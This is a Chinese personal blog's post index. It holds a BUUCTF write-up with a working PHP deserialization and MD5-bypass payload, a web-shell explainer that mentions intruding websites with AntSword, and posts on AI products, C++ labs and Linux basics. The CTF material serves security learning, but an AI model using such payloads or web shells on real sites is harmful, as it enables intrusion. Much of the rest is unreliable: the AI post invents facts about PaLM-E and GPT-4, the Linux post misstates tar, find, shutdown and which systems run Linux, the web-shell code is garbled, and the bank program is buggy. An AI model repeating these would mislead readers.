[{"title":"BUU CODE REVIEW 1 1_解题记录","url":"/2023/04/24/BUU%20CODE%20REVIEW%201%201_%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"BUU CODE REVIEW 1 1平台：BUUCTF在线评测 (buuoj.cn)\n题目：\n\nCODE REVIEW 意为代码审计\n代码审计是指对程序源代码进行检查分析，发现其中的错误信息、安全隐患和规范性缺陷问题，以及针对由这些问题引发的安全漏洞，提供代码修复措施和建议。它是防御性编程范例的一个组成部分，它试图在软件发布之前减少错误。\n简而言之从，意思就是让你分析这段代码的功能\n这是一个php脚本，我们发现if后面的unserialize() \nunserialize() 函数将二进制数据作为参数传递给 unserialize() 函数，并返回相应的 PHP 对象。当二进制数据被加密或编码时，unserialize() 函数可以将其解码为 PHP 对象。\nif段内的代码是用get方法传递pleaseget变量值为1，用post方法传递pleasepost变量值为1，然后用post方法传递md51和md52的内容不同，但是md5值相同\n由于代码是逐行运行的，因此我们想要达到unserialize() ，首先得使其运行if段内的函数\n如何操作呢？？\n此时就需要我们利用一个php漏洞：反序列化漏洞（php对象注入）\n详见：【技术分享】神奇的php反序列化-安全客 - 安全资讯平台 (anquanke.com)\n其中就涉及unserialize() 这个函数\nunserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。返回的是转换之后的值，可为 integer、float、string、array 或 object。如果传递的字符串不可解序列化，则返回 FALSE。与之相对的函数serialize()序列化函数。\n序列化：是将变量转换为可保存或传输的字符串的过程 ；（编码）\n反序列化：就是在适当的时候把这个字符串再转化成原来的变量使用；（解码）\n漏洞利用：\n在本地运行代码打印出序列化后的数据\n例子：原题：\n&lt;?php/** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */highlight_file(__FILE__);class BUU &#123;   public $correct = &quot;&quot;;   public $input = &quot;&quot;;   public function __destruct() &#123;       try &#123;           $this-&gt;correct = base64_encode(uniqid());           if($this-&gt;correct === $this-&gt;input) &#123;               echo file_get_contents(&quot;/flag&quot;);           &#125;       &#125; catch (Exception $e) &#123;       &#125;   &#125;&#125;if($_GET[&#x27;pleaseget&#x27;] === &#x27;1&#x27;) &#123;    if($_POST[&#x27;pleasepost&#x27;] === &#x27;2&#x27;) &#123;        if(md5($_POST[&#x27;md51&#x27;]) == md5($_POST[&#x27;md52&#x27;]) &amp;&amp; $_POST[&#x27;md51&#x27;] != $_POST[&#x27;md52&#x27;]) &#123;            unserialize($_POST[&#x27;obj&#x27;]);        &#125;    &#125;&#125;\n\n我们在后面加一句：\n$obj=new BUU();$obj-&gt;input =&amp;$obj-&gt;correct;$obj=serialize($obj);echo $obj;?&gt;\n\n变成：\n&lt;?phpclass BUU &#123;   public $correct = &quot;&quot;;   public $input = &quot;&quot;;   public function __destruct() &#123;       try &#123;           $this-&gt;correct = base64_encode(uniqid());           if($this-&gt;correct === $this-&gt;input) &#123;               echo file_get_contents(&quot;/flag&quot;);           &#125;       &#125; catch (Exception $e) &#123;       &#125;   &#125;&#125;if($_GET[&#x27;pleaseget&#x27;] === &#x27;1&#x27;) &#123;    if($_POST[&#x27;pleasepost&#x27;] === &#x27;2&#x27;) &#123;        if(md5($_POST[&#x27;md51&#x27;]) == md5($_POST[&#x27;md52&#x27;]) &amp;&amp; $_POST[&#x27;md51&#x27;] != $_POST[&#x27;md52&#x27;]) &#123;            unserialize($_POST[&#x27;obj&#x27;]);        &#125;    &#125;&#125;$obj=new BUU();$obj-&gt;input =&amp;$obj-&gt;correct;$obj=serialize($obj);echo $obj;?&gt;\n\n运行结果形如\nO:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;\n\n然后我们需要将if中满足的条件和上面的数据上传，因为要满足所有条件才可以进行反序列化\n我们发现条件中有md5，这就牵扯到了MD5加密漏洞，也叫md5绕过（具体参见MD5加密漏洞(MD5绕过方式-0e绕过&#x2F;数组绕过&#x2F;MD5碰撞&#x2F;MD5SQL注入)-阿里云开发者社区 (aliyun.com)）\n此处可以用到0e绕过或数组绕过\n0e绕过简而言之就是：0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;即为  0&#x3D;&#x3D; 0，这个式子是永真的，所以我们只要传入两个md5值是以0e开头的参数,即可绕过md5加密\n下面这些经过md5加密后均为以0e开头\n   QNKCDZO\n   240610708\n   byGcY\n   sonZ7y\n   aabg7XSs\n   aabC9RqS\n   s878926199a\n   s155964671a\n   s214587387a\n   s1091221200a\n可以记录一下，具体用到几个就可以传几个\n数组绕过：\n例如：\nmd5(a[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b[]&#x3D;1)\n判断时，为\nnull&#x3D;null\n永真\n好了，介绍完md5加密，接下来继续：\n我们说到要将if中满足的条件和上面的数据上传，可以用hackbar这款插件，下面以火狐浏览器为例：\n构造条件pleaseget和pleasepost\npleasepost=2&amp;md51=s155964671a&amp;md52=s214587387a&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;\n\n\n点击execute后，回显flag\n","categories":["CTF"],"tags":["CTF","hackbar","MD5绕过","反序列化漏洞","代码审计"]},{"title":"AI合集","url":"/2023/03/29/ai%E4%BA%A7%E5%93%81/","content":"最近几个月，不同以往，我的主页已经被AI刷屏，我也见到了各种各样、形形色色的AI产品，为了防止遗忘，在这里简单记录一下。\nPaLM-E谷歌发布的视觉语言AI\n谷歌和柏林工业大学的团队重磅推出史上最大的视觉语言模型——PaLM-E，参数量高达5620亿（GPT-3的参数量为1750亿）。集成语言、视觉，用于机器人控制。相比大语言模型（LLM)，它被称为视觉语言模型（VLM）。VLM与LLM不同之处，在于VLM对物理世界是有感知的。\n据目前的信息，谷歌PaLM-E是谷歌在自然语言处理领域中开发的一种语言模型。PaLM-E代表“Pre-training and Language Model-Enhanced”，它是基于谷歌的Bert（Bidirectional Encoder Representations from Transformers）模型的进一步改进。\n相比于Bert模型，PaLM-E模型引入了一些额外的技术和改进。其中一项重要的改进是“瓶颈层”，它可以通过使用较小的瓶颈层减少模型的计算负担，并提高模型的训练和推理效率。另外，PaLM-E还增加了一种新的训练目标，称为“语言模型增强（Language Model-Enhanced）目标”，它可以帮助模型更好地处理长序列和未知单词等情况。\nminiMAX公司:一家中国的AI研究公司\nGEN-2:3月20日，Runway 发布了 Gen-2可以用自然语言生成视频，动动嘴皮子，AI 帮你做视频\nGen-2 是一个多模态 AI 模型，支持：文本生成视频 Text 2 Video图像生成视频 Image 2 Video视频生成视频 Video 2 Video\nGPT-4:GPT-4是基于Transformer的模型，经过训练后可以预测文档中的next token。为了提高准确性和确保GPT-4遵守行为规范，OpenAI在预训练阶段使用RLHF，同时在后训练过程中控制模型。\nUSM:3月6日，谷歌就推出了一款大语言模型——USM。不仅可以支持100多种语言，而且参数量也达到了20个亿。相关论文地址：https://arxiv.org/abs/2303.01037\nmidjourney V5Midjourney是Disco Diffusion的原作者Somnai所加入的AI艺术项目实验室。\nMidJourney 是一个类似于 DALL·E 的文本到图像的 AI，专长于“漂亮”图像。您可以通过在聊天应用程序 Discord 中向机器人发送消息来使用它——它不是 Web 应用程序，但也不需要任何编程。它可以免费试用，或者之后的基本计划每月收费 10 美元。\n而midjourney V5是其最新的一个版本，您可以通过与机器人“交谈”，在一个名为 Discord（国外社交软件） 的流行聊天应用程序中使用它。\ncopilotGitHub Copilot 是一种 AI 工具，可根据命名或者正在编辑的代码上下文为开发者提供代码建议。根据官方介绍，Copilot 已经接受了来自 GitHub 上公开可用存储库的数十亿行代码的训练，它支持大多数编程语言，但官方建议使用 Python、JavaScript、TypeScript、Ruby 和 Go。\nCopilot 是 GitHub 和OpenAI合作的结果， OpenAI得到了微软的大力支持。它由一个名为 Codex 的全新 AI 系统提供支持，该系统基于 GPT-3 模型。\n简而言之，就是一个可集成到vscode中的，可以帮你写代码的AI\nbing image createrImage Creator 是 Microsoft 基于 AI 的新型艺术生成工具，现已在 Microsoft Bing 中提供。Image Creator 由 OpenAI 的 DALL-E 2 技术提供支持，允许用户根据自然语言描述创建原始图像。还可以提供其他上下文，例如位置、活动或艺术风格，以自动生成图像。\nBing Image Creator 将完全集成到 Bing 聊天体验中，最初将在创意模式中分阶段使用。Image Creator 预览版也将在 Microsoft Edge 中提供，使 Edge 成为第一个也是唯一一个具有集成人工智能图像生成器的搜索引擎！要在 Edge 中使用 Image Creator，请单击边栏中的 Bing Image Creator 图标进行创建。\ngoogle bard 2 月 7 日凌晨，谷歌 CEO 桑达尔·皮查伊（Sundar Pichai）宣布，谷歌将推出一款由 LaMDA 模型支持的对话式人工智能服务，名为 Bard。\nBard 寻求将世界知识的广度与大型语言模型的力量、智慧和创造力相结合。它将利用来自网络的信息来提供新鲜的、高质量的回复。它既是创造力的输出口，也是好奇心的发射台。\nBard 的工作方式大概率与 ChatGPT 类似，都是通过对话来回答用户的问题或者提供用户想要的信息，用户可以不断地追问、改进、丰富自己的问题，让 AI 的回答更贴近自己想要的东西。\n值得注意的是，bard只能用英文对话，且不会写代码，对上下文的记忆能力较弱\nAdobe firefly在3月22日，创作工具领域的龙头霸主Adobe用一款全新的AI创作产品引爆了业界。\n据Adobe介绍，此次推出的AI产品名为Firefly，将作为艺术创作者的辅助工具集成进旗下Creative Cloud系列多款产品。而英伟达也在同日的GTC大会上宣布与Adobe形成战略合作，共同开发AI创作工具产品。\n据Adobe官方所列举的功能来看，Adobe Firefly将会是一款“全能AI模型”，提供图片修改、视频剪辑、3D材质生成、音频生成、笔刷、矢量图等一系列内容的AI生成与修改服务。而这些服务将会紧密Adobe的使用场景，面向专业用户的使用需求进行开发。\nAdobe宣称AI技术将可以被用在视频的剪辑上。在官方演示中，用户可以通过文字prompt一键式改变视频色调。Adobe还表示用户可以用Firefly在After Effects中实现一些更复杂的效果。在目前，文字生成视频（text-to-video）类的AI产品还尚处雏形阶段，市场上还尚未出现拥有足够竞争力的产品。\n英伟达 h100显卡3月22日，NVIDIA首席执行官黄教主在GTC22主题演讲中发布了新一代的专业显卡H100\n因为身处生物领域，在简绍落地情况的时候非常强调了AI在生命科学的一些应用，这也是NVIDIA在长期布局和发力的地方。当然简绍了他们在其他地方实际应用的落地情况 ,例如 使用欧洲中期天气预报中心40年的模拟增强的数据ERA5为基础，得到的基于物理信息的深度学习模型FourCastNet, 采用自适应傅里叶神经算子 (Adaptive Fourier Neural Operator，AFNO) 模型。\nNVIDIA推出了推荐系统的AI框架Merlin，NVIDIA Merlin 包括特征转换，召回和模型排序，进而可以快速构建、部署和扩展现金的深度学习推荐系统……\n总而言之，h100是为了更好的服务AI而制造的显卡\n"},{"title":"c++实验记录","url":"/2023/04/02/c++%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95/","content":"实验一：类和对象定义一个学生类 Student，学生类中有 3 个私有数据成员：name(姓名)、cls(班级)、grade(年级)；3 个公有成员函数；Student(构造函数)、display、~Student(析构函数)。使用构造函数为 Student 类的对象赋值(name 使用动态内存分配空间)，display 负责显示学生的基本信息，在析构函数中释放动态分配的内存。\n#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;class Students &#123;private:    char* name;    int cls;    int grade;public:    Students(const char* n, int c, int g) &#123;        name = new char[strlen(n) + 1];        strcpy(name, n);        cls = c;        grade = g;    &#125;    void display() const &#123;        cout &lt;&lt; &quot;name=&quot; &lt;&lt; name &lt;&lt; endl;        cout &lt;&lt; &quot;cls=&quot; &lt;&lt; cls &lt;&lt; endl;        cout &lt;&lt; &quot;grade=&quot; &lt;&lt; grade &lt;&lt; endl;    &#125;        ~Students() &#123;        delete[] name;    &#125;&#125;;int main() &#123;    Students a(&quot;xiaomin&quot;, 3, 3);    a.display();    return 0;&#125;system(&quot;pause&quot;);\n\n\n\n实验二：继承和派生编写一个学生和教师数据输入和显示程序。其中，学生数据有编号、姓名、班级和成 绩，教师数据有编号、姓名、职称和部门。要求将编号、姓名输入和显示设计成一个类 Person； 然后设计类 Person 的派生类：学生类 Student 和教师类 Teacher；编写一个主函数，通过定 义 student、teacher 的对象，完成相应功能。\n#include &lt;iostream&gt;using namespace std;class Person &#123;protected:int id;string name;public:void input() &#123;cout &lt;&lt; &quot;请输入编号：&quot;;cin &gt;&gt; id;cout &lt;&lt; &quot;请输入姓名：&quot;;cin &gt;&gt; name;&#125;void display() &#123;cout &lt;&lt; &quot;编号：&quot; &lt;&lt; id &lt;&lt; endl;cout &lt;&lt; &quot;姓名：&quot; &lt;&lt; name &lt;&lt; endl;&#125;&#125;;class Student : public Person &#123;protected:string className;int score;public:void input() &#123;Person::input();cout &lt;&lt; &quot;请输入班级：&quot;;cin &gt;&gt; className;cout &lt;&lt; &quot;请输入成绩：&quot;;cin &gt;&gt; score;&#125;void display() &#123;Person::display();cout &lt;&lt; &quot;班级：&quot; &lt;&lt; className &lt;&lt; endl;cout &lt;&lt; &quot;成绩：&quot; &lt;&lt; score &lt;&lt; endl;&#125;&#125;;class Teacher : public Person &#123;protected:string title;string department;public:void input() &#123;Person::input();cout &lt;&lt; &quot;请输入职称：&quot;;cin &gt;&gt; title;cout &lt;&lt; &quot;请输入部门：&quot;;cin &gt;&gt; department;&#125;void display() &#123;Person::display();cout &lt;&lt; &quot;职称：&quot; &lt;&lt; title &lt;&lt; endl;cout &lt;&lt; &quot;部门：&quot; &lt;&lt; department &lt;&lt; endl;&#125;&#125;;int main() &#123;Student student;Teacher teacher;cout &lt;&lt; &quot;请输入学生信息：&quot; &lt;&lt; endl;student.input();cout &lt;&lt; &quot;请输入教师信息：&quot; &lt;&lt; endl;teacher.input();cout &lt;&lt; &quot;学生信息如下：&quot; &lt;&lt; endl;student.display();cout &lt;&lt; &quot;教师信息如下：&quot; &lt;&lt; endl;teacher.display();return 0;&#125;//包含三个类：Person、 Student、 Teacher。//1. Person类是基类，包含两个数据成员：id和name，以及两个成员函数：input()和display()，用于输入和输出基类对象的信息。//2. Student类是从Person派生而来的子类，又增加了两个数据成员：className和score，以及两个成员函数：input()和display()，用于输入和输出学生对象的信息。在子类中的input()函数中，首先调用基类的input()函数，再输入className和score。//3. Teacher类同样是从Person派生而来的子类，又增加了两个数据成员：title和department，以及两个成员函数：input()和display()，用于输入和输出教师对象的信息。在子类中的input()函数中，同样首先调用基类的input()函数，再输入title和department。//在main()函数中，首先定义了一个Student对象和一个Teacher对象。然后输入学生信息和教师信息，并输出他们的信息。\n\n实验四以现实中银行卡为原型，进行需求调查，抽象出相应的类，设计类的成员函数和数据成员，完成银行账户管理系统。编写程序，帮助工作人员有效、准确并且高校的完成存取事件。（系统主要完成开户管理，存取钱管理，修改密码，注销等功能）\n#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 用户结构体  struct User &#123;    string username; // 用户名      int account_number; // 账户号码      string password; // 密码      bool is_active; // 是否激活  &#125;;// 用户数组  User users[10];int user_count = 0;// 添加用户  void add_user() &#123;    if (user_count &gt;= 10) &#123;        cout &lt;&lt; &quot;用户数已达上限！&quot; &lt;&lt; endl;        return;    &#125;    User user;    cout &lt;&lt; &quot;请输入用户名：&quot;;    cin &gt;&gt; user.username;    cout &lt;&lt; &quot;请输入账户号码：&quot;;    cin &gt;&gt; user.account_number;    cout &lt;&lt; &quot;请输入密码：&quot;;    cin &gt;&gt; user.password;    cout &lt;&lt; &quot;请输入是否激活（1表示激活，0表示未激活）：&quot;;    cin &gt;&gt; user.is_active;    users[user_count] = user;    user_count++;    cout &lt;&lt; &quot;添加成功！&quot; &lt;&lt; endl;&#125;// 查找用户  User find_user(string username) &#123;    for (int i = 0; i &lt; user_count; i++) &#123;        if (users[i].username == username) &#123;            return users[i];        &#125;    &#125;    return User();&#125;// 存款  void deposit() &#123;    string username, password;    int amount;    cout &lt;&lt; &quot;请输入存款账户号码：&quot;;    cin &gt;&gt; username;    User user = find_user(username);    if (user.username == &quot;&quot;) &#123;        cout &lt;&lt; &quot;账户不存在！&quot; &lt;&lt; endl;        return;    &#125;    cout &lt;&lt; &quot;请输入存款金额：&quot;;    cin &gt;&gt; amount;    cout &lt;&lt; &quot;请输入密码：&quot;;    cin &gt;&gt; password;    if (user.password != password) &#123;        cout &lt;&lt; &quot;密码错误！&quot; &lt;&lt; endl;        return;    &#125;    user.account_number += amount;    cout &lt;&lt; &quot;存款成功！账户余额为：&quot; &lt;&lt; user.account_number &lt;&lt; endl;&#125;// 取款  void withdraw() &#123;    string username, password;    int amount;    cout &lt;&lt; &quot;请输入取款账户号码：&quot;;    cin &gt;&gt; username;    User user = find_user(username);    if (user.username == &quot;&quot;) &#123;        cout &lt;&lt; &quot;账户不存在！&quot; &lt;&lt; endl;        return;    &#125;    cout &lt;&lt; &quot;请输入取款金额：&quot;;    cin &gt;&gt; amount;    if (amount &gt; user.account_number) &#123;        cout &lt;&lt; &quot;取款失败！账户余额不足！&quot; &lt;&lt; endl;        return;    &#125;    cout &lt;&lt; &quot;请输入密码：&quot;;    cin &gt;&gt; password;    if (user.password != password) &#123;        cout &lt;&lt; &quot;密码错误！&quot; &lt;&lt; endl;        return;    &#125;    user.account_number -= amount;    cout &lt;&lt; &quot;取款成功！账户余额为：&quot; &lt;&lt; user.account_number &lt;&lt; endl;&#125;// 修改密码  void change_password() &#123;    string username, old_password, new_password;    cout &lt;&lt; &quot;请输入账户号码：&quot;;    cin &gt;&gt; username;    User user = find_user(username);    if (user.username == &quot;&quot;) &#123;        cout &lt;&lt; &quot;账户不存在！&quot; &lt;&lt; endl;        return;    &#125;    cout &lt;&lt; &quot;请输入旧密码：&quot;;    cin &gt;&gt; old_password;    if (user.password != old_password) &#123;        cout &lt;&lt; &quot;密码错误！&quot; &lt;&lt; endl;        return;    &#125;    cout &lt;&lt; &quot;请输入新密码：&quot;;    cin &gt;&gt; new_password;    user.password = new_password;    cout &lt;&lt; &quot;密码修改成功！&quot; &lt;&lt; endl;&#125;int main() &#123;    int choice;    do &#123;        cout &lt;&lt; &quot;请选择要进行的操作：&quot; &lt;&lt; endl;        cout &lt;&lt; &quot;1. 添加用户&quot; &lt;&lt; endl;        cout &lt;&lt; &quot;2. 存款&quot; &lt;&lt; endl;        cout &lt;&lt; &quot;3. 取款&quot; &lt;&lt; endl;        cout &lt;&lt; &quot;4. 修改密码&quot; &lt;&lt; endl;        cout &lt;&lt; &quot;5. 退出&quot; &lt;&lt; endl;        cin &gt;&gt; choice;        switch (choice) &#123;        case 1:            add_user();            break;        case 2:            deposit();            break;        case 3:            withdraw();            break;        case 4:            change_password();            break;        case 5:            cout &lt;&lt; &quot;谢谢使用！&quot; &lt;&lt; endl;            break;        default:            cout &lt;&lt; &quot;无效的选择，请重新输入。&quot; &lt;&lt; endl;            break;        &#125;    &#125; while (choice != 5);    return 0;&#125;\n\n"},{"title":"零基础 “一句话木马”解析","url":"/2023/03/26/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/","content":"&lt;?php    @eval(cat flag/);?&gt;\n\n首先，编写其用到的语言为php语言\n这是一个php脚本\n“&lt; ? ? &gt;” 是 PHP 的短标签形式，它是一种用于嵌入 PHP 代码的语法\n它包含了一个 eval() 函数，eval() 函数可以接受一个字符串作为参数，将其解析为 PHP 代码并执行\n这段代码的作用是读取名为 “flag” 的文件并将其内容作为字符串传递给 eval() 函数\n在这个过程中使用了 “@” 符号来抑制可能出现的错误信息输出，从而避免了可能会暴露敏感信息的错误提示\n也就是说，“flag”这个内容可更改\n而且“flag”被eval()函数接收了\n利用  中国蚁剑  或者  中国菜刀  等渗透测试工具即可注入一句话木马来远程连接控制网站，以达到入侵目的\n以中国蚁剑为例，“flag”即为其连接密码\n使用中国蚁剑黑入靶场的例子如下：\n\n        \n            \n                \n                \n                    \n                \n                00:02:56\n            \n            \n                BUUCTF Upload-Labs- Linux 1  教程\n                \n                    \n                        \n                        175\n                    \n                        \n                        0\n                \n                    视频\n                    \n                    玄兎\n                \n                \n            \n        \n    \n"},{"title":"kali 教程","url":"/2023/05/15/kali%E6%8A%98%E8%85%BE/","content":"查看系统内核\nuname -a\n\n"},{"title":"Linux学习 for 菜鸟","url":"/2023/05/18/linux%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B/","content":"下面的文字较长，不喜欢看的也可以直接看&#x2F;&#x2F;斜体加粗大致了解一下\n#####    tips：网页端按 ctrl + f可以进行查找哦  #####\n\n一，什么是linux？&#x2F;&#x2F;是一种操作系统\nLinux是一种自由和开放源码的类Unix操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布。它主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。\nLinux具有丰富的内置功能和强大的社区支持，使其成为众多企业和个人用户的首选操作系统。它适用于几乎所有类型的计算机硬件，从手机、平板电脑到大型机和超级计算机。Linux还是免费使用和自由传播的，这使得它成为许多开发者和用户的首选，可以根据自己的需求和兴趣定制和修改。\nLinux的名字来源于计算机业余爱好者Linus Torvalds，他在1991年发布了第一个Linux内核。虽然当时Linux还没有完全成形，但Torvalds认为这个操作系统很“Linux-like”，因此就给它起了这个名字。\n\n二，Linux的使用场景，为什么要学习linux？&#x2F;&#x2F; linux是网安学习的基础\nLinux广泛用于以下场景：\n\n服务器操作系统：Linux可以用于构建高性能、可靠的服务器操作系统，如Apache、Nginx、MySQL、Redis等应用程序都可以在Linux上运行。\n嵌入式系统：Linux可以用于嵌入式系统，如智能电视、智能音箱、智能家居等。由于Linux具有小巧、低功耗、高可靠性等优点，因此在这些设备中得到广泛应用。\n桌面系统：Linux可以用于构建桌面操作系统，如Ubuntu、Debian、CentOS等。Linux的桌面环境提供了丰富的应用程序和用户界面，可以满足用户的需求。\n移动设备：Linux可以用于构建嵌入式设备和移动设备的操作系统，如Android、iOS、BlackBerry等。由于Linux具有开放源代码和广泛的社区支持，因此可以使用各种开源库和工具来构建这些设备的操作系统。\n开发环境：Linux可以用于搭建开发环境，如Code::Blocks、Eclipse、GitLab等开发工具。这些工具可以提供集成开发环境（IDE）和调试工具，帮助开发者更高效地进行开发。\n网络服务器：Linux可以用于构建网络服务器，如Apache、Nginx等。Linux具有高可用性和高性能等优点，因此在大型网络和企业级应用中得到广泛应用。\n高校计算机课程：Linux可以用于教育机构的计算机课程，如CS Courses 提供的Linux操作系统课程。学生可以通过学习Linux操作系统来了解计算机系统的工作原理，并学会使用各种基本的计算机软件和工具。\n\n\n三，如何学习linux？\n选择一个比较合适的Linux发行版：首先需要选择一个比较合适的Linux发行版，如Debian或Ubuntu。这些发行版具有广泛的社区支持和稳定性，可以满足大多数用户的需求。&#x2F;&#x2F;有图形化界面，适合萌新，类似Windows，自己电脑上学习linux一般是用vmware安装对应虚拟机进行学习\n学习基础命令：学习Linux的基础命令是非常重要的，例如ls、cd、cp、mv等。你可以通过阅读Linux的文档或参考教程来学习这些命令。&#x2F;&#x2F;linux的操作都是可以靠指令完成的\n学习操作系统基础概念：了解操作系统的基础概念，如进程、线程、文件系统、网络等，可以帮助你更好地理解Linux。你可以阅读Linux的文档或参考教程。&#x2F;&#x2F;小白暂时可以忽略，先学好最基础的只要入了门，也就知道如何自学了\n学习代码规范和分布式管理代码：学习代码规范和分布式管理代码对于成为一个优秀的程序员非常重要。你可以参考Linux的代码规范或使用Git等工具来管理代码。\n学习高级命令和技巧：Linux提供了许多高级命令和技巧，如use grep、crontab等。你可以通过参考文档或参考教程来学习这些命令和技巧。\n实践：最后，你需要不断地实践，尝试使用Linux解决实际问题。你可以通过参加Linux的培训课程或使用Linux自带的练习工具来实践。***&#x2F;&#x2F;最重要的是实践，即使理论性的东西不是非常懂，只要多实践，自然会豁然开朗***\n\n\n四，选择合适的linux发行版，在虚拟机中安装linux推荐使用ubuntu（乌班图）\nUbuntu20.04版本镜像文件（ubuntu-20.04.6-desktop-amd64.iso）：链接：https://share.weiyun.com/aMm2RiqF 密码：ajrb8t\n安装vmware：\n官网版17版本：点击下载，可以试用30天\n想要正版长期使用有俩途径，1，淘宝或并夕夕搜vmware激活码，大概三块钱一个，直接激活了，2，网上找破解版，这里主要是讲学习Linux，故不讨论破解的问题。\n安装完打开长这样：（我的是16版本）\n\n因为要写的东西太多了，看这个吧： 超详细VMware安装Ubuntu虚拟机步骤_ubuntu vmware-CSDN博客\n我主要讲一下可能会遇到的问题：1，如果你安装完，发现用着用着就就越来越卡，最后卡死\n请检查c盘空间是否足够，最好还空闲20g以上。\n2.vmware打开虚拟机提示产品与此版本不兼容，或者发生错误，导致虚拟 CPU 进入关闭状态。如果虚拟机外部发生此错误，则可能已导致物理计算机重新启动……\n确定你的vmware版本，假如是16，然后打开你的虚拟机安装目录：\n\n右键vmx文件，用记事本打开\n\n查看上面字段是否和自己的VMware版本号一致，若不一致，则改一致，重启即可\n3，安装时窗口太小，“下一步”按钮被挡住了：\n按下Alt+F7，同时按下鼠标左键，然后拖动窗口\n4，鼠标点进了虚拟机，出不来了。\n按ctrl+alt\n\n虚拟机安装就这样告一段落，接下来就可以学习Ubuntu了！任何地方都可以“用终端打开”\n终端 就是输入命令的地方\n打开后长这个样\n\nubuntu@ 你的用户名：~&#x2F;地址$ \n为了方便，下面的命令统一不再配图，除非遇到特殊说明情况\n\n一，命令下面来学习基础命令：\n获取管理员权限 sudo susudo su\n\n需要输入账户的密码，输入时不显示，输完回车即可\n获取管理员权限的目的：管理员（root）权现是最高权现，获取后可以更改任意文件及设置\n得知目前所在的路径 pwdpwd\n\n得到目前所在路径，用户的操作是有地址的，特定目录有特定的职能，因此在进行默某些特殊操作时你需要到特定的目录里面去，这个命令就是让你得知你目前在那个目录\n列出当前目录下的文件夹  lsls\n\n例子：\nls\n回显：music   photos\n则表明目前的目录下面有music和photos两个文件夹\n读取文件 catcat\n\n用于查看文件的内容，而不需要在任何文本编辑器中打开它\n读取一个名为flag.txt的文件\ncat flag.txt\n\n回显： ctf{you_ar4_righ4}\n表明你读取了一个名为flag.txt的文件，其内容是 ctf{you_ar4_righ4}\n查看当前文件夹下所有的文件内容\ncat *\n\n关机 shutdown例子\n​\t关机并重启：\nshutdown -r now\n\n这将在当前用户下强制关闭系统，并在5秒后重启。\n​\t关机但不重启：\nshutdown -h now\n\n这将关闭系统，但不重启。\n​\t关机后等待10分钟后重启：\nshutdown -r +10 10分钟后重启\n\n这将在当前用户下强制关闭系统，并在10分钟后重启。\n关机后等待10点钟重启：\nshutdown -h +10 10点钟重启\n\n这将关闭系统，并在10点钟时重启。\n仅发送警告信息而不关机：\nshutdown -k now\n\n这将发送一条警告信息，但不会强制关闭系统。\n立即关机并切断电源：\nshutdown -P now\n\n这将立即关闭系统并切断电源。\n目录操作 cdLinux中的cd命令用于在文件系统中切换目录。它的语法如下：\ncd [目录路径]\n\n例如，要切换到根目录，可以使用以下命令：\ncd /\n\n要切换到上一级目录，可以使用以下命令：\ncd ..\n\n要切换到当前目录的子目录，可以使用以下命令：\ncd /path/to/directory\n\n要更改到特定目录，可以使用以下命令：\ncd /tmp\n\n要返回上一个目录，可以使用以下命令：\ncd -\n\n删除 rmrm命令用于删除文件或目录。它的语法如下：\nrm [选项] 文件或目录\n\n\n\n例如，要删除当前目录下的test文件，可以使用以下命令：\nrm test\n\n\n\n要删除一个文件夹，可以使用以下命令：\nrm -r directory/\n\n其中，directory&#x2F;是要删除的文件夹路径。\n解压 压缩  tartar命令用于将文件打包成归档文件，并且可以解包归档文件。它的语法如下：\ntar [选项] [文件或目录1] [文件或目录2] ... [文件或目录N]\n\n\n\n例如，要将当前目录下的所有文件和目录打包成一个归档文件，并且命名为howtoing-16-apr-2013.tar.gz，可以使用以下命令：\ntar -xvf howtoing-16-apr-2013.tar.gz\n\n\n\n要从归档文件中解包文件，可以使用以下命令：\ntar -xvf howtoing-16-apr-2013.tar\n\n其中，howtoing-16-apr-2013.tar是要解包的归档文件名。\n查找 findfind命令是一个用于在文件系统中查找文件和目录的常用工具。它的语法如下：\nfind [选项] 目录 -type f -name [文件名]\n\n\n\n例如，要在当前目录及其子目录中查找所有扩展名为.txt的文件，可以使用以下命令：\nfind . -type f -name &quot;*.txt&quot;\n\n\n\n要在当前目录及其子目录中查找所有以”example”开头的文件，并且不包含”.txt”扩展名，可以使用以下命令：\nfind . -type f -name &quot;example*&quot;\n\n\n\n要在当前目录及其子目录中查找所有大小大于100MB的文件，可以使用以下命令：\nfind . -type f -size +100M\n\n其中，+100M表示查找大小不超过100MB的文件。\n要递归搜索整个文件系统，可以使用以下命令：\nfind / -type d -name &quot;*&quot; -print\n\n其中，&#x2F;&#96;表示搜索根目录。\n复制 cpcp命令用于复制文件或目录。它的语法如下：\ncp [选项] 源文件 目标文件\n\n\n\n例如，要将当前目录下的test文件复制到test_copy目录中，可以使用以下命令：\ncp test test_copy\n\n\n\n要将当前目录下的文件test复制到当前目录中，可以使用以下命令：\ncp test .\n\n\n\n要将当前目录下的文件test_copy复制到当前目录中，并且将test文件的权限更改为可读、可写和可执行，可以使用以下命令：\ncp test_copy ./test_copy\n\n其中，.&#x2F;test_copy表示将test_copy文件移动到当前目录中。\n移动 mvmv命令用于移动文件或目录。它的语法如下：\nmv [选项] 源文件 目标文件\n\n\n\n例如，要将当前目录下的test文件移动到test_copy目录中，可以使用以下命令：\nmv test test_copy\n\n\n\n要将当前目录下的文件test移动到当前目录中，可以使用以下命令：\nmv test .\n\n\n\n要将当前目录下的文件test_copy移动到当前目录中，并且将test文件的权限更改为可读、可写和可执行，可以使用以下命令：\nmv test_copy ./test_copy\n\n\n\n新建文件夹mkdir是用于在文件系统中创建新目录的命令。它的语法如下：\nmkdir [选项] 目录名\n\n\n\n例如，要在当前目录下创建一个名为test的新目录，可以使用以下命令：\nmkdir 